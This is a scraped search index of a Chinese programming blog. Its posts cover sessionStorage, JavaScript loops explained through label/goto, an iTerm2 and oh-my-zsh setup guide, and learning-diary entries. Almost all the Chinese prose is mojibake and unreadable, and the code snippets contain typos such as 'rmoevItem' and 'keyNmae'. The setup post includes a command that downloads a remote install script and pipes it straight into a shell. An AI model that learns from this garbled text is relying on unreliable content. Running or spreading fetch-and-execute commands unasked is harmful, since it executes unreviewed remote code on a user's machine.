å·®ä¸å¤šï¼š window.sessionStorage.setItem(key, value) window.sessionStorage.getItem(keyName) window.sessionStorage.rmoevItem(keyNmae) ç‰¹åˆ¥æ³¨æ„æ¯å€‹åˆ†é éƒ½æœƒå»ºç«‹ä¸€å€‹ sessionï¼Œå› æ­¤ä¸åŒåˆ†é ä¸èƒ½å…±ç”¨å…§å®¹ï¼Œå¦å¤–é—œæ‰ç€è¦½å™¨å¾Œæœƒæ¸…é™¤æ‰€æœ‰å…§å®¹ï¼Œé€™é»æ˜¯è·Ÿ loaclStorage æœ€å¤§çš„å·®åˆ¥ã€‚ æœ‰é»é¡ä¼¼éŠæˆ²è£¡é¢çš„ã€Œå¯†èªè¦–çª—ã€å§ï¼Œä½ åªè¦è¦–çª—æ²’é—œæ‰å°è©±ç´€éŒ„å°±æœƒä¿ç•™ï¼Œä½†ä¸€é—œæ‰å°±æœƒæ¸…é™¤ã€‚é–‹æ–°åˆ†é å¯ä»¥æƒ³æˆæ˜¯é–‹æ–°çš„å¯†èªè¦–çª—ï¼Œç­‰åŒç¶²é ä¸­çš„å»ºç«‹æ–°çš„ã€Œsessionã€ã€‚è‡³æ–¼å…§å®¹çš„éƒ¨åˆ†å°±è·ŸèŠå¤©å®¤çª—ä¸€æ¨£ï¼Œå› ç‚ºæ˜¯å…¨æ–°çš„ sessionï¼Œæ‰€ä»¥ç•¶ç„¶ä¸æœƒæœ‰ä»¥å‰çš„ç´€éŒ„ï¼Œå…§å®¹æœƒæ˜¯ç©ºçš„ã€‚ ä¸€æ¨£ç°¡å–®ç¤ºç¯„ï¼ˆå…¶å¯¦å°±åªæ˜¯éƒ½æ”¹æˆ sessionStorageï¼‰ï¼š 12345678&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;å§“åï¼š&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\" size=\"20\"&gt; &lt;button class=\"input-block__button\"&gt;å„²å­˜&lt;/button&gt;&lt;/div&gt;&lt;!-- ç”¨ä¾†é¡¯ç¤ºå„²å­˜çš„å…§å®¹ --&gt;&lt;div class=\"block\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt;&lt;/div&gt; JavaScriptï¼š 123456789101112131415161718192021222324252627282930313233/* é‡æ–°æ•´ç†å¾Œåˆ° sessionStorage æŠ“å…§å®¹ åˆ†åˆ¥å¯«å…¥ï¼š .input-block__input: è¼¸å…¥æ¡† .input-block__input: ç¬¬ä¸€å€‹å€å¡Šï¼ˆJSON è§£æå¾ŒæŠ“å…§å®¹ï¼‰ .input-block__input: ç¬¬äºŒå€‹å€å¡Šï¼ˆåŸå§‹å­—ä¸²ï¼‰*/const oldValue = sessionStorage.getItem('username')if (oldValue) { document.querySelector('.input-block__input').value = oldValue document.querySelectorAll('.block')[0].innerText = JSON.parse(oldValue).username document.querySelectorAll('.block')[1].innerText = oldValue}// æŒ‰ä¸‹æŒ‰éˆ•å„²å­˜document.querySelector('.input-block__button') .addEventListener('click', function(e) { setSessionStorage('.input-block__input', 'username') }, false)// æ”¯æ´ Enter éµ window.addEventListener('keydown', function(e) { e.stopPropagation() if (e.key === 'Enter') setSessionStorage('.input-block__input', 'username')}, true)// å„²å­˜åˆ° localStoragefunction setSessionStorage(selector, key) { const input = document.querySelector(selector).value if (input) return sessionStorage.setItem(key, input) alert('è«‹è¼¸å…¥ä½ æƒ³å„²å­˜çš„å…§å®¹')}","link":"/2022/01/20/local-storage-and-session-storage/"},{"title":"é‡æ–°èªè­˜è¿´åœˆ","text":"æ²’æœ‰é‚£éº¼è¤‡é›œã€‚ å¾ label èˆ‡ goto ä¾†ç†è§£è¿´åœˆçš„æœ¬è³ªå…ˆä»‹ç´¹é€™å…©å€‹æ±è¥¿æ˜¯å› ç‚ºä¸ç®¡æ˜¯å“ªç¨®è¿´åœˆï¼Œæœ¬è³ªéƒ½æ˜¯é€™ä¸‰æ¨£æ±è¥¿ï¼š åˆå§‹å€¼ çµ‚æ­¢æ¢ä»¶ æ¯ä¸€åœˆè¦åšçš„äº‹ï¼ˆæ›´æ–°æ§åˆ¶è¿´åœˆçš„è®Šæ•¸å€¼ï¼‰ å¦‚æœæŠŠæ¯ç¨®è¿´åœˆçš„æ­¥é©Ÿæ‹†å‡ºä¾†åˆ†æï¼Œæœƒç™¼ç¾èƒŒå¾Œçš„æ¦‚å¿µéƒ½æ˜¯ç”¨label è·Ÿ goto ä¾†å¯¦ä½œçš„ã€‚ ï¼ˆJavaScript æ²’æœ‰é€™å€‹èªæ³•ï¼Œç´”ç²¹åªæ˜¯è¦è§£é‡‹é€™å€‹æ¦‚å¿µï¼‰ 12345678var i = 1 // åˆå§‹å€¼loop: // labelconsole.log(i) // æ¯ä¸€åœˆè¦åšçš„äº‹i++ // æ›´æ–°æ§åˆ¶è¿´åœˆçš„è®Šæ•¸if (i &lt;= 10) { // çµ‚æ­¢æ¢ä»¶ goto loop // goto lbael (loop) }console.log('finished') // loop end è©¦è‘—è‡ªå·±æŠŠä¸€å€‹æ­¥é©Ÿèµ°éä¸€éï¼š å»ºç«‹åˆå§‹å€¼ i = 1 loop æ˜¯æ¨™ç±¤ï¼Œä¸ç†å®ƒ å°å‡º i æ›´æ–° i çµ‚æ­¢æ¢ä»¶ï¼Œi&lt;=10 çš„è©±å°±è·³å› loop å°å‡º finished æœ€å¾Œä½ æœƒç™¼ç¾é€™å°±è·Ÿä½ ç”¨è¿´åœˆçš„èªæ³•å¯«å‡ºä¾†çš„çµæœä¸€æ¨£ï¼š 123456789101112345678910finished do while å…ˆåšå†èªªå› ç‚º do while ä¸å¸¸ç”¨ï¼Œæ‰€ä»¥é‚„è »å¸¸å¿˜è¨˜å®ƒçš„èªæ³•ã€‚ä¸€å€‹æ¯”è¼ƒç›´è¦ºçš„æƒ³æ³•ï¼šä¸€å€‹è¿´åœˆå°±æ˜¯ä¸€å€‹ blockï¼Œæ‰€ä»¥è¦åšï¼ˆdoï¼‰çš„äº‹æƒ…å°±æ”¾åœ¨ block è£¡ã€‚ do while çš„æµç¨‹ï¼š åˆå§‹å€¼ æ¯ä¸€åœˆè¦åšçš„äº‹ï¼ˆæ›´æ–°æ§åˆ¶è¿´åœˆçš„è®Šæ•¸å€¼ï¼‰ çµ‚æ­¢æ¢ä»¶ 12345var i = 0do { console.log(i) i++} while (i &lt;= 10) while å°±æ˜¯æˆ‘ç†Ÿæ‚‰çš„å®ƒwhile è·Ÿ do whie æœ€ä¸ä¸€æ¨£çš„åœ°æ–¹æ˜¯ï¼šã€Œå…ˆåˆ¤æ–·æ¢ä»¶ã€ï¼Œæ¥è‘—æ‰åŸ·è¡Œè¿´åœˆå€å¡Šã€‚ while çš„æµç¨‹ï¼š åˆå§‹å€¼ çµ‚æ­¢æ¢ä»¶ æ¯ä¸€åœˆè¦åšçš„äº‹ï¼ˆæ›´æ–°æ§åˆ¶è¿´åœˆçš„è®Šæ•¸å€¼ï¼‰ å–®èˆ‰ä¾‹å­å¤ªç„¡èŠäº†ï¼Œæ‰€ä»¥åšé»æœ‰è¶£çš„ï¼š 12345var i = 0while (i &lt;= 10) { console.log(i++)}console.log('i = ', i) i++ å¯«åœ¨ log ä¹Ÿæ²’å•é¡Œå“¦ï¼ï¼ˆä¸çŸ¥é“ç‚ºä»€éº¼çš„è©±ç½°ä½ å›å»çœ‹ i++ æ˜¯ä»€éº¼æ„æ€ï¼‰ for loopå…¶å¯¦ for è·Ÿ while çš„æµç¨‹æ˜¯ä¸€æ¨£çš„ï¼š åˆå§‹å€¼ çµ‚æ­¢æ¢ä»¶ æ¯ä¸€åœˆè¦åšçš„äº‹ï¼ˆæ›´æ–°æ§åˆ¶è¿´åœˆçš„è®Šæ•¸å€¼ï¼‰ åªæ˜¯ while çš„çµæ§‹å¯«èµ·ä¾†æ²’æœ‰é‚£éº¼å¥½è®€ï¼š 123456var i = 0 // åˆå§‹å€¼while (i &lt;= 100) { // çµ‚æ­¢æ¢ä»¶ console.log(i) // ... i+=2 // æ¯ä¸€åœˆè¦åšçš„äº‹} for æŠŠæ±è¥¿éƒ½å¯«åœ¨ä¸€è¡Œè£¡ï¼Œä¸€ç›®äº†ç„¶ï¼š 12345// åŒä¸€è¡Œæ‰€ä»¥è¦å¥é»for (var i=0; i&lt;=100; i++) { console.log(i) // ...} åœ¨å¹«ä½ è¤‡ç¿’ä¸€ä¸‹ï¼Œå¦‚æœä½ ç”¨ label è·Ÿ goto çš„æ¦‚å¿µä¾†è§£æ for è·Ÿ while çš„è©±ï¼Œæœƒç™¼ç¾åšçš„äº‹æƒ…éƒ½ä¸€æ¨£ï¼š 1234567var i = 0:check if (i&lt;=10) { console.log(i) i++ goto check}console.log('finished') åˆå§‹å€¼ çµ‚æ­¢æ¢ä»¶ï¼ˆä¸ç¬¦åˆå°±è·³ç¬¬äº”æ­¥ï¼‰ åŸ·è¡Œè¿´åœˆ blockï¼ˆæ›´æ–°æ§åˆ¶è®Šæ•¸çš„å€¼ï¼‰ è·³å›ç¬¬äºŒæ­¥ çµæŸ break èˆ‡ continueå³ä¾¿è¿´åœˆæœ¬èº«å·²ç¶“è‡ªå¸¶ã€Œçµ‚æ­¢æ¢ä»¶ã€ï¼Œä½†æœ‰äº›æ™‚å€™æˆ‘å€‘æœƒæƒ³è¦åœ¨åŸ·è¡Œã€Œè¿´åœˆ blockã€çš„éç¨‹ä¸­ä¾†æ§åˆ¶è¿´åœˆçš„åŸ·è¡Œæµç¨‹ï¼š è·³å‡ºè¿´åœˆ å¿½ç•¥æ‰é‚£ä¸€åœˆè¦åšçš„äº‹æƒ… é€™å€‹æ™‚å€™ break è·Ÿ continue å°±æ´¾ä¸Šç”¨å ´äº†ã€‚ breakç¢°åˆ° break æ™‚ï¼Œä¸æœƒåŸ·è¡Œä¹‹å¾Œçš„æŒ‡ä»¤ï¼Œç›´æ¥è·³å‡ºè¿´åœˆã€‚ é€™è£¡åˆ©ç”¨ break ä¾†åœ¨è¿´åœˆå€å¡Šä¸­å»ºç«‹çµ‚æ­¢æ¢ä»¶ï¼š 123456789var i = 0do { console.log(i) i++ if (i &gt; 100) { break }} while (true)console.log('i=', i) å„˜ç®¡ while (true) æœƒè¹¦å‡ºä¸€å€‹ã€Œç„¡çª®è¿´åœˆã€ï¼Œä½†å› ç‚ºæˆ‘å€‘åœ¨è¿´åœˆå€å¡Šä½¿ç”¨äº† break ä¾†æ§åˆ¶æµç¨‹ï¼Œæ‰€ä»¥åœ¨ i=101 çš„æ™‚å€™ï¼Œè¿´åœˆå°±æœƒçµæŸã€‚ continueç¢°åˆ° continue æ™‚ï¼Œä¸æœƒåŸ·è¡Œä¹‹å¾Œçš„æŒ‡ä»¤ï¼Œç›´æ¥è·³ä¸‹ä¸€åœˆè¿´åœˆã€‚ é€™è£¡å¯«ä¸€å€‹ç¢°åˆ°å¥‡æ•¸å°±è·³ä¸‹ä¸€åœˆçš„è¿´åœˆï¼š 123456789var i = 0do { if (i&amp;1) { i++ continue } console.log(i) i++} while (i &lt;= 10) ç°¡å–®çš„æ‡‰ç”¨ç”¨ä¸‰ç¨®ä¸åŒçš„è¿´åœˆä¾†ã€Œå°å‡ºåˆ†æ•¸çš„ç¸½å’Œã€ do while 123456789var i = 0var scores = [70, 32, 52, 66, 90]var sum = 0do { sum += scores[i] i++} while(i&lt;scores.length)console.log(sum) while 12345678var scores = [70, 32, 52, 66, 90]var sum = 0var i = 0while (i&lt;scores.length) { sum += scores[i] i++}console.log(sum) for 123456var scores = [70, 32, 52, 66, 90]var sum = 0for (var i=0; i&lt;scores.length; i++) { sum += scores[i]}console.log(sum) i&lt;n è·Ÿ i&lt;=n çš„ç†è§£æ–¹å¼å‰›é–‹å§‹å­¸è¿´åœˆçš„æ™‚å€™å¾ˆå¸¸æœƒææ·· &lt; è·Ÿ &lt;= çš„å·®åˆ¥ã€‚å…¶å¯¦æœ‰å€‹ç°¡å–®çš„åˆ¤æ–·æ³•ï¼š i&lt;5ï¼ŒåªæœƒåŸ·è¡Œåˆ° 4 i&lt;=5ï¼ŒæœƒåŸ·è¡Œåˆ° 5 æˆ‘çš„è¨˜æ³•æ˜¯åªè¦çœ‹åˆ° &lt;=ï¼Œå°±è¡¨ç¤ºä¸€å®šæœƒç¢°åˆ° nï¼›ä¸æ˜¯çš„è©±å°±æ˜¯ n - 1 æ­é… Array.length ä½¿ç”¨çš„æ™‚å€™ï¼Œé€šå¸¸éƒ½æ˜¯å¯« &lt;ï¼Œå› ç‚ºã€Œç´¢å¼•å€¼ã€æ˜¯å¾ 0 é–‹å§‹ï¼Œæ‰€ä»¥å‡è¨­é•·åº¦æ˜¯ 5ï¼Œæœ€å¾Œä¸€å€‹ç´¢å¼•å€¼å°±æœƒæ˜¯ 4ï¼š0 =&gt; 1 =&gt; 2 =&gt; 3 =&gt; 4","link":"/2021/12/18/loop/"},{"title":"è¨­å®š Mac iterm2 æ‡¶äººåŒ…","text":"çœŸçš„ç¾ã€‚ åªæ˜¯æƒ³é †ä¾¿è¨˜ä¸€ä¸‹çš„å¿«æ·éµ Command + T å¯ä»¥é–‹æ–°åˆ†é  Command + Left / Right å¯ä»¥åˆ‡æ›åˆ†é  Commadn + W é—œé–‰ç›®å‰çš„åˆ†é  ç°¡è¿°1. å®‰è£ iTerm2 2. ä¸‹è¼‰é…è‰²ä¸»é¡Œ æˆ‘æ¨è–¦çš„æœ‰ï¼š dracula Tomorrow Night ä¸‹è¼‰ä¸‹ä¾†çš„è³‡æ–™å¤¾è£¡é¢æœƒæœ‰ä¸€å€‹ .itermcolorsï¼Œæ¥è‘—æ‰“é–‹ iterm2 &gt; Preferences &gt; Profile &gt; Colorsï¼Œ å³ä¸‹è§’çš„ä¸‹æ‹‰é¸å–®æœ‰ä¸€å€‹ import é¸é …ï¼Œé»é¸å¾ŒæŠŠå‰›å‰›çš„æª”æ¡ˆå¼•å…¥é€²å»å¾Œï¼Œä¸‹ä¸€æ¬¡å°±å¯ä»¥é¸æ“‡äº†ã€‚ 3. å®‰è£å­—å‹ æœ‰äº›æ¯”è¼ƒæ½®çš„ç¬¦è™Ÿä¸åƒåŸç”Ÿå­—å‹ï¼Œæ‰€ä»¥è¨˜å¾—è¦ä¸‹è¼‰å­—é«”ï¼Œæˆ‘ç”¨çš„æ˜¯ JetBrainsMonoï¼Œè£¡é¢æœ‰åˆ†æˆ Mac æˆ– Window ç‰ˆæœ¬ï¼Œè¨˜å¾—ä¸‹è¼‰æ­£ç¢ºçš„ã€‚ ä¸‹è¼‰å¥½å¾Œä¸€æ¨£åˆ° Preferences å»æ”¹å°±è¡Œäº†ã€‚ 4. å®‰è£ oh-my-zsh 1sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 5. è¨­å®šä¸»é¡Œ é™„è¨»ï¼šè¦æ”¹ä¸»é¡Œéƒ½æœƒåˆ° ~/.zshrc ä¾†æ”¹ã€‚ 1vim ~/.zshrc æ¥è‘—æ‰¾åˆ° ZSH_THEMEï¼ŒæŠŠå®ƒæ”¹æˆä½ è¦çš„é‚£å€‹ä¸»é¡Œå°±è¡Œäº†ï¼Œæˆ‘æ˜¯ç”¨ tonotdo 6. ä¿®æ”¹ä¸»é¡Œè¨­å®š é€™é‚Šæ˜¯é‡å° tonotdo ä¾†åšçš„é¡å¤–è¨­å®šï¼Œè©³ç´°å¯ä»¥åƒè€ƒ[å¿ƒå¾—] iTerm2 + zshï¼Œæ‰“é€ æ›´å¥½çš„å·¥ä½œç’°å¢ƒ ç¸½ä¹‹æŠŠå‰ä¸‰è¡Œæ”¹æˆé€™æ¨£å°±è¡Œäº†ï¼š 1PROMPT='%{$fg_no_bold[yellow]%}[%*] %{$fg_no_bold[cyan]%}%n%{$fg_no_bold[red]%} âœ %{$fg_no_bold[green]%}%3~$(git_prompt_info)%{$reset_color%}Â» ' ä»¥ä¸Šï¼Œæœ€å¾Œå‰¯å€‹çµå°¾åœ–ï¼ åƒè€ƒè³‡æº Mac çµ‚ç«¯æ©Ÿ (Terminal)è¨­å®šï¼š iTerm 2 [å¿ƒå¾—] iTerm2 + zshï¼Œæ‰“é€ æ›´å¥½çš„å·¥ä½œç’°å¢ƒ","link":"/2022/05/11/mac-iterm2-set-up/"},{"title":"mentor-program-day01","text":"ä»Šå¤©æ˜¯åƒåŠ å­¸ç¿’è¨ˆç•«çš„ç¬¬ä¸€å¤©ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€ä»½ç´€éŒ„ã€‚ ä¸çŸ¥é“ä½ å€‘æœ‰æ²’æœ‰çœ‹éä¸€äº›é›»å½±æˆ–å¡é€šï¼Œé€šå¸¸ç§‘å­¸å®¶æˆ–æ˜¯å¯¦é©—å®¶éƒ½æœƒåœ¨åšè‡ªå·±åšæ¸¬è©¦çš„æ™‚å€™æ‹ä¸€æ®µç´€éŒ„çš„å½±ç‰‡ï¼ŒæŠŠæ¯ä¸€å¤©éƒ½è¨˜éŒ„ä¸‹ä¾†ã€‚æˆ‘è¦ºå¾—ç¾åœ¨çš„è‡ªå·±å°±å¥½åƒé‚£äº›è§’è‰²ä¸€æ¨£ã€‚ é€²åº¦ä»Šå¤©å¾ˆå¿«åœ°å°±æŠŠ Command Line çš„èª²ç¨‹çµ¦çœ‹å®Œäº†ï¼Œé‚„æœ‰ Git çš„éƒ¨åˆ†çœ‹åˆ°äº† 32% çš„é€²åº¦ã€‚ æˆ‘ä¹Ÿä¸çŸ¥é“é€™æ¨£ç®—å¿«é‚„æ˜¯æ…¢ï¼Œä½†è‡³å°‘è‡ªå·±æ˜¯è¦ºå¾—é€™æ¨£çš„é€²åº¦é‚„ OKã€‚ å­¸åˆ°çš„äº‹æƒ…é¦–å…ˆæ˜¯ Command Line çš„éƒ¨åˆ†ã€‚ åœ¨ä¸Šèª²ä¹‹å‰ï¼Œæˆ‘æœ€å¸¸ç”¨çš„å°±æ˜¯ cdã€lsã€start é€™å¹¾å€‹æŒ‡ä»¤ã€‚çœ‹ä¾†æˆ‘ç¢ºå¯¦æœ‰é»å°‘ç”¨ Command Line ä¾†åšæ“ä½œï¼Œå¤ªä¾è³´ GUI äº†ã€‚ ä»¥ä¸‹é€™äº›æ˜¯æˆ‘åœ¨ä»Šå¤©ä¸Šå®Œèª²å¾Œå¾©ç¿’åˆ°çš„æŒ‡ä»¤ï¼š pwd å°å‡ºç›®å‰çš„ä½ç½® man æŸ¥çœ‹æŒ‡ä»¤çš„ç”¨èªªæ˜ touch æ›´æ”¹æª”æ¡ˆçš„æœ€å¾Œä¿®æ”¹æ™‚é–“ï¼Œæˆ–æ˜¯å»ºç«‹æ–°æª”æ¡ˆï¼ˆç¢°ä¸€ä¸‹ï¼‰ rm åˆªé™¤æª”æ¡ˆ mkdir å»ºç«‹æ–°çš„è³‡æ–™å¤¾ cp è¤‡è£½æª”æ¡ˆ vim é€²å…¥æ–‡å­—ç·¨è¼¯å™¨ vimï¼ˆé€™å€‹çœŸçš„ä¸éŒ¯ï¼Œæˆ‘åœ¨ä»Šå¤©æ‰çŸ¥é“å®ƒçš„å¯¦ç”¨æ€§ï¼‰ i é€²å…¥ç·¨è¼¯æ¨¡å¼ï¼ˆå¯ä»¥æ’å…¥æ–‡å­—ï¼‰ esc é€²å…¥æ™®é€šæ¨¡å¼ grep æŠ“å‡ºé—œéµå­— wget ä¸‹è¼‰å¤–éƒ¨æª”æ¡ˆ curl é€å‡º requestï¼ˆæˆ‘åˆ°ä»Šå¤©æ‰çŸ¥é“é€™å€‹æŒ‡ä»¤çš„ç”¨é€”ï¼ŒçœŸæ˜¯æ…šæ„§ï¼‰ cat é€£çµæª”æ¡ˆï¼Œå¦‚æœåªæŒ‡å®šä¸€å€‹æª”æ¡ˆçš„è©±æœƒç›´æ¥å°å‡ºå…§å®¹ï¼ˆè¨˜å¾—ä»¥å‰æœ‰å­¸éï¼Œä½†å¤ªä¹…æ²’æ‘¸å°±å¿˜äº†ï¼Œå¥½åœ¨ä»Šå¤©åˆå›ä¾†ä¸Šäº†é€™é–€èª²ï¼‰ pipe çµ„åˆè¨ˆæ–½å±•ï¼ŒæŠŠå·¦é‚Šçš„ output ç•¶ä½œå³é‚Šçš„ inputï¼ˆè·Ÿ cat ä¸€æ¨£ï¼Œè¨˜å¾—é€™å…©å€‹éƒ½æ˜¯åœ¨ Coding ç«çƒè¡“çš„æ™‚å€™å­¸åˆ°çš„æŒ‡ä»¤ï¼‰ æ¥è‘—æ˜¯é—œæ–¼ Git çš„éƒ¨åˆ†ã€‚ ä¸å¾—ä¸èªªã€Œè³‡æ–™å¤¾æ¨¡æ“¬æ³•ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“è¦æ€éº¼å½¢å®¹ï¼Œå°±åˆ¥åæ§½æˆ‘äº†ï¼‰ã€çš„é€™ç¨®è¬›è§£æ–¹å¼ï¼ŒçœŸçš„å½·å½¿é†é†çŒé ‚ã€‚é»˜é»˜çš„ç‚ºä»¥å‰çœ‹æ›¸å­¸ Git çš„æˆ‘æ„Ÿåˆ°æ·¡æ·¡çš„å“€å‚·ã€‚ æˆ‘å¾ˆå–œæ­¡ç”¨æ—¥å¸¸ç”Ÿæ´»ä¸Šçš„ä¾‹å­ä¾†è§£é‡‹ç‰ˆæœ¬æ§åˆ¶é€™ä»¶äº‹ï¼Œé‚„æœ‰å¾è‡ªå·±å»ºç«‹ä¸€å€‹ç‰ˆæœ¬æ§åˆ¶çš„è§€å¿µä¾†çªºè¦– Git èƒŒå¾Œçš„ç°¡å–®æ¦‚å¿µã€‚å·¥å…·ç¢ºå¯¦æ˜¯ç”¨ä¾†å¹«åŠ©æˆ‘å€‘æ›´å¥½çš„å»è§£æ±ºæŸäº›å•é¡Œï¼Œè€Œä¸æ˜¯ç”¨ä¾†æ‹–ç´¯æˆ‘å€‘ï¼Œæˆ‘è¦ºå¾—æˆ‘æ¼¸æ¼¸åœ°èƒ½ç†è§£é€™å€‹èªªæ³•èƒŒå¾Œçš„æ¶µç¾©äº†ã€‚ ä»Šå¤©å­¸åˆ°çš„ Git æŒ‡ä»¤å…¶å¯¦ä¹‹å‰éƒ½æœ‰å­¸éï¼Œæ‰€ä»¥é€™é‚Šå°±ä¸ç‰¹åˆ¥åˆ—å‡ºä¾†äº†ï¼Œç­‰è¦åšç­†è¨˜çš„æ™‚å€™æœƒåœ¨å¯«æ¸…æ¥šä¸€é»ã€‚ ä¸€äº›æ„Ÿæƒ³å…¶å¯¦æˆ‘æœ‰é»å¥½å¥‡ç‚ºä»€éº¼æœ‰äº›äººèƒ½å¤ ç”¨å¾ˆç°¡å–®çš„æƒ³æ³•å»è§£é‡‹ä¸€ä»¶çŸ¥è­˜ï¼ˆä¾‹å¦‚èªªè³‡æ–™å¤¾æ¨¡æ“¬æ³•ï¼‰ï¼Œæˆ‘è©¦è‘—å•éè‡ªå·±èº«é‚Šçš„äººé€™å€‹å•é¡Œã€‚æˆ‘å¾—åˆ°çš„å›ç­”å¾ˆç°¡å–®ï¼šå¤šæ•¸äººå…¶å¯¦ä¹Ÿåªèƒ½æ˜¯å¾åˆ¥äººçš„èº«ä¸Šå»é ˜æ‚ŸæŸäº›äº‹ï¼Œåˆæˆ–è€…æ˜¯å‰›å¥½ç™¼ç”Ÿäº†ä»€éº¼æ‰€ä»¥æ‰è®“ä»–ç†è§£äº†æŸä»¶äº‹ã€‚ä½†æˆ‘é‚„æ˜¯æƒ³ä¸é€šç‚ºä»€éº¼æœƒæœ‰é€™ç¨®å·®ç•°ï¼Œå› ç‚ºæˆ‘ç¸½æ˜¯æ²’ä»€éº¼è‡ªå·±çš„æƒ³æ³•çš„æ„Ÿè¦ºã€‚ å°±å¥½æ¯”ä»¥å‰çš„æˆ‘å­¸ Git æ™‚çœ‹æ›¸å­¸äº†å¥½å¹¾å¤©ï¼Œå»åªå­¸åˆ°å†°å†·å†·çš„æŒ‡ä»¤ã€‚æˆ‘æ²’æœ‰å° Git ç”¢ç”Ÿä»€éº¼ç‰¹æ®Šçš„æ„Ÿæƒ…ï¼ŒåªçŸ¥é“ä»–æ˜¯ä¸€å€‹èº«ç‚ºè»Ÿé«”å·¥ç¨‹å¸«éƒ½æ‡‰è©²è¦å­¸æœƒçš„æ±è¥¿ï¼Œæ‰€ä»¥æˆ‘å¿…é ˆæŠŠå®ƒå­¸æœƒã€‚ è¦æˆ‘ç”¨è‡ªå·±çš„æ–¹å¼ä¾†æ•™äºº Git çš„è©±ï¼Œæˆ‘å¤§æ¦‚ä¹Ÿæœƒåƒæˆ‘çœ‹çš„æ›¸ä¸€æ¨£ï¼Œå†°å†·å†·çš„å‘Šè¨´ä½ å¯ä»¥æ€éº¼ç”¨ Git çš„æŒ‡ä»¤ï¼Œç„¶å¾ŒæŠŠ Git è¬›çš„åƒæ˜¯å¾ˆå²å®³çš„æ±è¥¿ï¼Œä½†ä½ å¯èƒ½æ„Ÿè¦ºä¸å‡ºä¾†ä»–å“ªè£¡å²å®³ã€‚ é‚„æ˜¯è¬›äº›å…¶ä»–çš„å§ï¼Œå…¶å¯¦æˆ‘æŒºé–‹å¿ƒè‡ªå·±è¨‚é–±äº† Lidemy çš„èª²ç¨‹ã€‚é›–ç„¶æ‰å‰›é–‹å§‹ï¼Œå­¸çš„éƒ½åªæ˜¯äº›å¾ˆåŸºç¤çš„æ±è¥¿ï¼Œä½†æˆ‘é‚„æ˜¯å­¸åˆ°äº†ä¸å°‘æ±è¥¿ã€‚ ç†±æƒ…æ˜¯å¾ˆé‡è¦çš„ä¸€ä»¶äº‹ï¼Œåœ¨ä¸Šé€™é–€èª²çš„æ™‚å€™ï¼Œæˆ‘å¾ Huli çš„èº«ä¸Šçœ‹åˆ°äº†ä¸€è‚¡å–œæ­¡ç¨‹å¼çš„ç†±æƒ…ã€‚æœ‰æ™‚å€™æˆ‘æœƒè¦ºå¾—æ™‚é–“éå¾—å¥½æ…¢ï¼Œå¥½æ…¢ã€‚ä½†æ˜¯ä»Šå¤©ä¸ä¸€æ¨£ï¼Œæ™‚é–“å½·å½¿ä¸€ä¸‹å°±æµé€äº†ã€‚æˆ‘å…¶å¯¦ä¹Ÿé‚„æƒ³å†ç¹¼çºŒä¸Šèª²ï¼Œä½†æ™‚é–“é‚„æ˜¯è¦æ§åˆ¶å¦¥ç•¶æ‰è¡Œã€‚ æœŸè¨±æˆ‘è¦ºå¾—ä»Šå¤©æ˜¯å¾ˆé–‹å¿ƒçš„ä¸€å¤©ï¼Œä¹Ÿå¾ˆæƒ³è¶•å¿«è®“è‡ªå·±å­¸ç¿’è¶Šä¾†è¶Šå¤šäº‹æƒ…ï¼Œå¸Œæœ›èƒ½å¤ é›¢è‡ªå·±çš„ç›®æ¨™è¶Šä¾†è¶Šæ¥è¿‘ã€‚ å¸Œæœ›æ˜å¤©æˆ‘èƒ½å¤ æŠŠ Git çš„èª²ç¨‹éƒ½çœ‹å®Œã€‚ç›®å‰çš„æƒ³æ³•æ˜¯æ¯å¤©éƒ½è¦æ‰“å¿ƒå¾—ï¼Œé‚„æœ‰æŠŠå­¸ç¿’åˆ°çš„æ±è¥¿éƒ½åšæˆä¸€å€‹æ–‡ç« ç­†è¨˜ï¼Œé€™æ¨£å­ç•¶æˆ‘éœ€è¦çš„æ™‚å€™å°±å¯ä»¥ä¾†éƒ¨è½æ ¼ç¿»ä¾†çœ‹ã€‚","link":"/2021/12/11/mentor-program-day01/"},{"title":"mentor-program-day02","text":"ä»Šå¤©æ˜¯å­¸ç¿’è¨ˆç•«çš„ç¬¬äºŒå¤©ï¼Œä¸€æ¨£ä¾†è¨˜éŒ„ä¸€ä¸‹è‡ªå·±åœ¨ä»Šå¤©åšäº†ä»€éº¼ã€‚ é€²åº¦ä»Šå¤©çš„é€²åº¦ä¸å¤šï¼ŒåªæŠŠ Git çš„éƒ¨åˆ†çœ‹åˆ°äº† 49%ã€‚ å…¶å¯¦æœ¬ä¾†é æœŸè¦æŠŠ Git çš„èª²ç¨‹çµ¦å…¨éƒ¨çœ‹å®Œï¼Œä¸éä¸‹åˆçš„æ™‚å€™å°±è·Ÿå¥³æœ‹å‹å‡ºé–€å»æ•£æ•£å¿ƒï¼Œæ‰€ä»¥å°±åªçœ‹äº†ä¸€äº›è€Œå·²ã€‚ å› ç‚ºå¸Œæœ›è‡ªå·±é‚„æ˜¯èƒ½æœ‰ä¸€é»é€²åº¦ï¼Œæ‰€ä»¥æ™šä¸Šåˆ©ç”¨äº†ä¸€é»æ™‚é–“æŠŠæ˜¨å¤©å­¸åˆ°çš„ Git çŸ¥è­˜æ•´ç†æˆä¸‰ç¯‡ç­†è¨˜ã€‚ å¾è‡ªå·±åšç‰ˆæ§ä¾†å­¸ Git å¾è³‡æ–™å¤¾ä¾†ç†è§£åˆ†æ”¯çš„æ¦‚å¿µ è§£æ±º Git ä¸­çš„è¡çªï¼ˆConflictï¼‰ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©è®“æˆ‘æœ€å°è±¡æ·±åˆ»çš„éƒ¨åˆ†æ˜¯ã€ŒConflictã€çš„éƒ¨åˆ†å§ã€‚ä»¥å‰åœ¨çœ‹æ›¸å­¸ Git çš„æ™‚å€™ï¼ŒCoflict ä¸€ç›´æ˜¯æˆ‘æ²’å¼„æ‡‚çš„éƒ¨åˆ†ï¼ˆä¹Ÿå¯èƒ½æ˜¯é‚£æœ¬æ›¸å¯«çš„å¤ªç³Ÿå§ï¼‰ã€‚ ä»¥å‰å…¶å¯¦ä¹Ÿæ²’æœ‰å¾ˆæ‡‚ Git å¯¦éš›ä¸Šå¥½ç”¨çš„åœ°æ–¹ï¼Œæ‰€ä»¥åˆ¥èªªè¦å»ºç«‹åˆ†æ”¯ï¼Œé€£è¦ç”¨åˆ° Git 